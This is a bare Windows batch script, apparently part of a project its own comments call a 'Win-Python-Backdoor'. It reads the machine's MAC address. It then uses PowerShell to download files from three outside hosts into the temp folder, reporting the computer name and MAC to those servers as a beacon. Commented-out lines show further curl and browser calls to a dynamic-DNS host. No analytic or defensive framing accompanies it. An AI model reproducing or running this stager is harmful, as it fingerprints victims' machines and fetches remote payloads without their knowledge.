for /f %%D in ('%windir%\System32\cmd.exe /c powershell -Command "& {Get-NetAdapter | select MacAddress -ExpandProperty MacAddress |  Select-Object -First 1}"') do set mac=%%D
%windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://config02.addns.org/svc/wup.php?pc=%computername%_%mac%_1','%temp%\%computername%_1')
%windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://paner.altervista.org/svc/wup.php?pc=%computername%_%mac%_1','%temp%\%computername%_2')
%windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://visionstore.info/svc/wup.php?pc=%computername%_%mac%_1','%temp%\%computername%_3')
rem Powershell.exe -executionpolicy remotesigned -File  C:\Users\pista\Documents\GitHub\Win-Python-Backdoor\get.ps1
rem curl http://verifiche.ddns.net/svc/wup.php?pc=%computername%_1 -o %temp%\%computername%_1
rem curl http://paner.altervista.org/svc/wup.php?pc=%computername%_1 -o %temp%\%computername%_2
rem "%ProgramFiles%\Internet Explorer\iexplore.exe" http://verifiche.ddns.net/svc/wup.php?pc=%computername%_ie